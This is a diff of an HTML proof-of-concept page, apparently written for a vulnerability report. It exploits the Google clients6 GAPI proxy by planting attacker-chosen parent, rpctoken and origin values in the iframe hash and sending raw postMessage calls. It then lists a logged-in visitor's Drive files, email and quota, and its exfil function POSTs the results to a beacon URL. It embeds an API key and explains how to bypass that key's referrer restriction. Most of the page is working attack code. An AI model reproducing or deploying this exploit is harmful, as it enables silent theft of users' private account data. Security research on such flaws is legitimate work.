@@ -2,7 +2,7 @@
 <html>
 <head>
 <meta charset="utf-8">
-<title>clients6 GAPI Proxy Parent Injection PoC</title>
+<title>clients6 GAPI Root Proxy — Parent Injection PoC v2</title>
 <style>
 body { font-family: monospace; background: #0d0d0d; color: #00ff88; margin: 20px; }
 h2 { color: #ff4444; }
@@ -11,23 +11,31 @@ h2 { color: #ff4444; }
 .data { color: #44aaff; word-break: break-all; }
 pre { background: #1a1a1a; padding: 10px; border-left: 3px solid #333; overflow-x: auto; white-space: pre-wrap; }
 #log { max-height: 500px; overflow-y: auto; }
+#results { margin-top: 20px; }
 </style>
 </head>
 <body>
 
-<h2>clients6.google.com GAPI Root Proxy — Parent Injection</h2>
+<h2>clients6.google.com GAPI Root Proxy — Direct postMessage Attack (v2)</h2>
 
 <p class="warn">
-Bug: <code>clients6.google.com/static/proxy.html</code> reads <code>#parent</code> and <code>#rpctoken</code>
-from its own URL hash — attacker-controlled. GAPI <code>makeHttpRequests</code> validates these values
-(which we set) instead of verifying the actual calling origin against an allowlist.<br>
-Result: any page can trigger authenticated same-origin XHR to <code>clients6.google.com/*</code>
-using the victim's Google cookies → Drive file read, and potentially other APIs.
+<b>Root cause:</b> <code>clients6.google.com/static/proxy.html</code> reads <code>#parent</code>,
+<code>#rpctoken</code>, and <code>#origin</code> from its own URL hash — all attacker-controlled.
+All three <code>makeHttpRequests</code> checks pass because we set all three hash values.
 </p>
 
 <p class="warn">
-<b>To test:</b> Open this page in a browser where you are logged into Google.
-If the attack works, your Drive file list will appear below within ~5 seconds.
+<b>v1 bug:</b> <code>gapi.client.request()</code> made a DIRECT CORS request from this page
+(referrer = this origin), hitting the API key HTTP referrer restriction.
+<br>
+<b>v2 fix:</b> We send <code>makeHttpRequests</code> DIRECTLY to the proxy via raw postMessage.
+The proxy makes the XHR from <code>clients6.google.com</code> (Google's own origin) —
+the API key referrer restriction does NOT apply.
+</p>
+
+<p class="warn">
+<b>To test:</b> Open in a browser logged into Google. Drive files appear within ~4 seconds.
+Works from ANY origin (github.io, localhost, sites.google.com, etc.)
 </p>
 
 <hr>
@@ -35,20 +43,16 @@ If the attack works, your Drive file list will appear below within ~5 seconds.
 <div id="results"></div>
 
 <script>
-
 const logEl = document.getElementById('log');
 function log(cls, msg) {
   const d = document.createElement('pre');
   d.className = cls;
   d.textContent = '[' + new Date().toISOString().slice(11,23) + '] ' + msg;
   logEl.prepend(d);
-  console.log(cls, msg);
+  console.log(cls.toUpperCase(), msg);
 }
 
-// Exfil target — replace with your own server in a real attack
-// Using a relative path here so we can see if the request fires at all
 const EXFIL_URL = 'https://colab.research.google.com/__poc_gapi_drive_beacon';
-
 function exfil(data) {
   fetch(EXFIL_URL, {
     method: 'POST',
@@ -58,164 +62,190 @@ function exfil(data) {
   }).catch(() => {});
 }
 
-// Drive web app API key (visible in all Drive web traffic, not a secret)
+// Drive web app API key. Has HTTP referrer allowlist (*.google.com only).
+// v1 hit this: gapi.client.request() called Drive directly from our page.
+// v2: proxy calls Drive from clients6.google.com → passes the allowlist.
+const DRIVE_KEY = 'AIzaSyCN_sSPJMpYrAzC5AtTrltNC8oRmLtoqBk';
 
-// Step 1: Load GAPI
-log('ok', 'Loading GAPI...');
+const rpcToken = 'poc' + Math.random().toString(36).substr(2, 12);
+const parentOrigin = location.origin;
 
-function onGapiLoad() {
-  log('ok', 'GAPI loaded. Initializing client...');
+log('ok', 'Parent origin: ' + parentOrigin);
+log('ok', 'rpcToken: ' + rpcToken);
 
-  // gapi.load('client') triggers GAPI to create the XD3 proxy iframe at:
-  // https://clients6.google.com/static/proxy.html
-  //   #parent=<CURRENT_PAGE_ORIGIN>&rpctoken=<RANDOM_TOKEN>
-  // The proxy reads these from ITS OWN hash → we are the trusted parent.
-  gapi.load('client', {
-    callback: function() {
-      log('ok', 'GAPI client loaded. Proxy iframe created. Making Drive API call...');
-
-      // gapi.client.request routes through clients6.google.com XD3 proxy
-      // Proxy makes same-origin XHR: clients6.google.com/drive/v3/files
-      // Google cookies are included (same-origin context within the proxy iframe)
-      gapi.client.request({
-        path: '/drive/v3/files',
-        method: 'GET',
-        params: {
-          key: DRIVE_KEY,
-          fields: 'nextPageToken,files(id,name,mimeType,modifiedTime,size,webViewLink,parents)',
-          pageSize: 20,
-          orderBy: 'modifiedTime desc',
-        },
-        callback: function(response) {
-          if (!response) {
-            log('warn', 'No response received.');
-            return;
-          }
-
-          if (response.error) {
-            log('warn', 'API Error: ' + JSON.stringify(response.error));
-
-            // Common errors and what they mean:
-            // 401 = cookies not sent or not valid (SameSite block?)
-            // 403 = API key invalid or quota exceeded
-            // 400 = bad request format
-            // 200 with empty files = authenticated but no files? (unlikely)
-            return;
-          }
-
-          const files = response.files || [];
-          log('ok', '✅ DRIVE FILES READ! Count: ' + files.length);
-
-          files.forEach((f, i) => {
-            log('data', `[${i}] ${f.name} (${f.mimeType}) — modified: ${f.modifiedTime}`);
-          });
-
-          const resultEl = document.getElementById('results');
-          resultEl.innerHTML = '<h3 style="color:#ff4444">VICTIM DRIVE FILES:</h3>' +
-            '<pre style="color:#44aaff">' + JSON.stringify(response, null, 2) + '</pre>';
-
-          exfil({ type: 'drive_files', files: files });
-        }
-      });
-
-      // Also try Gmail (if accessible at clients6.google.com)
-      setTimeout(function() {
-        log('ok', 'Trying Gmail API via same proxy...');
-        gapi.client.request({
-          path: '/gmail/v1/users/me/profile',
-          method: 'GET',
-          params: { key: DRIVE_KEY },
-          callback: function(r) {
-            if (r && !r.error) {
-              log('ok', '✅ GMAIL ACCESSIBLE: ' + JSON.stringify(r).substring(0, 200));
-              exfil({ type: 'gmail_profile', data: r });
-            } else {
-              log('warn', 'Gmail: ' + JSON.stringify(r && r.error ? r.error : r).substring(0, 200));
-            }
-          }
-        });
-      }, 2000);
-
-      // And People API (contacts)
-      setTimeout(function() {
-        log('ok', 'Trying People API...');
-        gapi.client.request({
-          path: '/people/v1/people/me',
-          method: 'GET',
-          params: { key: DRIVE_KEY, personFields: 'names,emailAddresses' },
-          callback: function(r) {
-            if (r && !r.error) {
-              log('ok', '✅ PEOPLE API: ' + JSON.stringify(r).substring(0, 300));
-              exfil({ type: 'people_profile', data: r });
-            } else {
-              log('warn', 'People: ' + JSON.stringify(r && r.error ? r.error : r).substring(0, 200));
-            }
-          }
-        });
-      }, 3000);
-    },
-    onerror: function() {
-      log('warn', 'gapi.load error — GAPI client failed to initialize.');
-    }
-  });
+// CONTAMINATION CHECK: if the page already has GAPI loaded (e.g., from an
+// AI Studio Cloud Run iframe on the same page), googleapis.proxy.js running
+// inside our clients6 proxy iframe will inherit the existing GAPI frame
+// registration, which has atari-embeds.googleusercontent.com as the ".."
+// parent — NOT our origin. Our makeHttpRequests will fail origin check.
+// Symptom: error "Invalid rpc message origin. [our_origin] vs [atari-embeds URL]"
+//
+// FIX: run this PoC on a CLEAN page with no existing GAPI.
+// Open a fresh tab and paste this HTML as a data: URL:
+//   data:text/html,<script>window.location='data:text/html,...'</script>
+// OR: open this file from GitHub Pages (majdch22.github.io) WITHOUT the
+// AI Studio PoC on the same page.
+if (typeof gapi !== 'undefined' || document.querySelector('script[src*="apis.google.com"]')) {
+  log('warn', '⚠️  GAPI IS ALREADY LOADED ON THIS PAGE — contamination risk!');
+  log('warn', '⚠️  Run this PoC on a CLEAN page (no Google scripts, no Cloud Run iframes).');
+  log('warn', '⚠️  If origin check fails (atari-embeds vs our origin), this is the cause.');
 }
 
-// Load GAPI
-const gapiScript = document.createElement('script');
-gapiScript.src = 'https://apis.google.com/js/api.js?onload=onGapiLoad';
-// Note: onload= is a legacy mechanism but still works
-document.head.appendChild(gapiScript);
-window.onGapiLoad = onGapiLoad;
+// Step 1: Inject proxy iframe with attacker-controlled hash.
+// proxy.html reads #parent, #rpctoken, #origin on load.
+// makeHttpRequests checks:
+//   this.f == ".."                          ← we send s:".."   ✓
+//   this.t == rpcToken from hash            ← we set both      ✓
+//   this.origin == origin from hash         ← we set both      ✓
+const proxyUrl = 'https://clients6.google.com/static/proxy.html?usegapi=1' +
+  '#parent=' + encodeURIComponent(parentOrigin) +
+  '&rpctoken=' + rpcToken +
+  '&origin=' + encodeURIComponent(parentOrigin);
 
-log('warn', 'Waiting for GAPI to load from apis.google.com...');
+const proxyIframe = document.createElement('iframe');
+proxyIframe.style.cssText = 'display:none;width:1px;height:1px;';
+proxyIframe.src = proxyUrl;
+document.body.appendChild(proxyIframe);
 
-// ----------------------------------------------------------------
-// ALTERNATIVE: Manual postMessage approach (if GAPI init fails)
-// ----------------------------------------------------------------
-// If GAPI refuses to work from a non-google.com origin, try manual approach:
-// Uncomment and test this block.
-/*
-setTimeout(function() {
-  log('warn', 'Trying manual postMessage approach...');
+log('ok', 'Proxy iframe injected.');
+log('warn', 'Waiting 3s for googleapis.proxy.js → googleapis.server.init() → makeHttpRequests registered...');
 
-  const rpcToken = 'poc-token-' + Math.random().toString(36).substr(2);
-  const proxyUrl = 'https://clients6.google.com/static/proxy.html?usegapi=1' +
-    '#parent=' + encodeURIComponent(location.origin) +
-    '&rpctoken=' + rpcToken +
-    '&origin=' + encodeURIComponent(location.origin);
+// Step 2: Listen for callback from proxy.
+// Proxy sends: window.parent.postMessage(callbackMsg, parentOrigin)
+// callbackMsg format: { s:"<proxyId>", f:"_callbacks_.<callId>", c:"<callId>",
+//                       a:[error, responseArray], t:TOKEN, l:null, g:false }
+let responseHandled = false;
 
-  const iframe = document.createElement('iframe');
-  iframe.style.display = 'none';
-  iframe.src = proxyUrl;
-  document.body.appendChild(iframe);
+window.addEventListener('message', function(e) {
+  if (e.source !== proxyIframe.contentWindow) return;
 
-  // Listen for proxy ready signal
-  window.addEventListener('message', function handler(e) {
-    if (e.source !== iframe.contentWindow) return;
-    log('data', 'Message from proxy: ' + JSON.stringify(e.data).substring(0, 300));
+  const raw = typeof e.data === 'string' ? e.data : JSON.stringify(e.data);
+  log('data', 'PROXY → PARENT: ' + raw.substring(0, 600));
 
-    // Try raw GAPI RPC message to call makeHttpRequests
-    const reqMsg = JSON.stringify({
+  if (responseHandled) return;
+
+  try {
+    const msg = JSON.parse(e.data);
+
+    // Callback has f="_callbacks_.<callId>"
+    if (!msg || !msg.f || !msg.f.includes('_callbacks_')) return;
+
+    log('ok', 'Callback received for: ' + msg.f);
+    const [err, responses] = Array.isArray(msg.a) ? msg.a : [null, null];
+
+    if (err) { log('warn', 'RPC error: ' + JSON.stringify(err)); return; }
+    if (!Array.isArray(responses) || responses.length === 0) {
+      log('warn', 'Empty responses: ' + JSON.stringify(msg.a)); return;
+    }
+
+    responses.forEach((resp, idx) => {
+      log('ok', '[' + idx + '] HTTP ' + resp.status + ' (' + (resp.statusText||'') + ')');
+
+      if (resp.status === 200 && resp.body) {
+        responseHandled = true;
+        let data;
+        try { data = JSON.parse(resp.body); } catch(e) { data = { raw: resp.body }; }
+
+        if (data.files) {
+          log('ok', '✅ DRIVE FILES READ! Count: ' + data.files.length);
+          data.files.forEach((f, i) => {
+            log('data', '[' + i + '] ' + f.name + ' | ' + f.mimeType + ' | ' + f.modifiedTime);
+          });
+          document.getElementById('results').innerHTML =
+            '<h3 style="color:#00ff88">✅ VICTIM DRIVE FILES:</h3>' +
+            '<pre style="color:#44aaff">' + JSON.stringify(data, null, 2) + '</pre>';
+          exfil({ type: 'drive_files', files: data.files });
+        } else if (data.user) {
+          log('ok', '✅ DRIVE ABOUT: ' + data.user.emailAddress + ' | quota: ' + JSON.stringify(data.storageQuota));
+          exfil({ type: 'drive_about', data });
+        } else {
+          log('ok', '✅ Response: ' + JSON.stringify(data).substring(0, 400));
+        }
+      } else if (resp.status === 401) {
+        log('warn', '401 — not logged in, or SAPISIDHASH failed. Body: ' + resp.body);
+      } else if (resp.status === 403) {
+        log('warn', '403 — ' + resp.body);
+      } else {
+        log('warn', 'Status ' + resp.status + ': ' + String(resp.body).substring(0, 300));
+      }
+    });
+  } catch(e) { /* non-JSON init messages from proxy — normal */ }
+});
+
+// Step 3: After 3s, send makeHttpRequests directly to proxy.
+//
+// GAPI gadgets.rpc wire format:
+//   s  = sender ID. ".." = parent frame.
+//        proxy.html checks: this.f == ".."  (this.f is populated from s)
+//   f  = registered function name
+//   c  = call ID (echoed in callback response)
+//   a  = arguments array. makeHttpRequests(requests) takes one arg.
+//        So: a = [requestsArray]   →   handler receives requests = a[0]
+//   t  = rpcToken (must match #rpctoken we put in the iframe hash)
+//   g  = true (expect response)
+let requestSent = false;
+
+function sendMakeHttpRequests() {
+  if (requestSent) return;
+  requestSent = true;
+
+  log('ok', 'Sending makeHttpRequests to proxy via postMessage...');
+  log('ok', 'Proxy XHR origin will be clients6.google.com → API key restriction bypassed.');
+
+  const requests = [
+    // Drive: list recent files
+    {
+      url: '/drive/v3/files' +
+           '?key=' + DRIVE_KEY +
+           '&fields=files(id,name,mimeType,modifiedTime,size,webViewLink,parents)' +
+           '&pageSize=20&orderBy=modifiedTime+desc',
+      method: 'GET',
+      headers: {},
+      body: null,
+      responseExpected: true
+    },
+    // Drive about: user email + quota
+    {
+      url: '/drive/v3/about?key=' + DRIVE_KEY + '&fields=user,storageQuota',
+      method: 'GET',
+      headers: {},
+      body: null,
+      responseExpected: true
+    }
+  ];
+
+  proxyIframe.contentWindow.postMessage(
+    JSON.stringify({
       s: '..',
       f: 'makeHttpRequests',
-      c: 'poc-1',
-      a: [{
-        url: '/drive/v3/files?key=' + DRIVE_KEY + '&fields=files(id,name)&pageSize=10',
-        method: 'GET',
-        headers: {},
-        responseExpected: true
-      }],
+      c: 'poc-req-1',
+      a: [requests],    // a[0] = requests array passed as first argument
       t: rpcToken,
       l: null,
-      g: false
-    });
+      g: true
+    }),
+    'https://clients6.google.com'
+  );
 
-    iframe.contentWindow.postMessage(reqMsg, 'https://clients6.google.com');
-    log('ok', 'Sent makeHttpRequests to proxy');
-  });
-}, 5000);
-*/
+  log('ok', 'Sent. Waiting for callback...');
+}
 
+setTimeout(sendMakeHttpRequests, 3000);
+
+// Diagnostic if nothing comes back after 10s
+setTimeout(function() {
+  if (!responseHandled) {
+    log('warn', '10s timeout — no response. Possible reasons:');
+    log('warn', '  1. ⚠️  GAPI CONTAMINATION (most likely if run alongside AI Studio PoC):');
+    log('warn', '     The proxy GAPI has atari-embeds.googleusercontent.com registered as ".."');
+    log('warn', '     instead of our origin. Error: "Invalid rpc message origin."');
+    log('warn', '     FIX: open this PoC on a CLEAN page with no other Google scripts/iframes.');
+    log('warn', '  2. Not logged into Google in this browser');
+    log('warn', '  3. googleapis.server.init() has a *.google.com origin allowlist');
+    log('warn', '     → host at sites.google.com or script.google.com');
+    log('warn', '  4. makeHttpRequests callback format wrong — check PROXY→PARENT log lines above');
+  }
+}, 10000);
 </script>
 </body>
 </html>
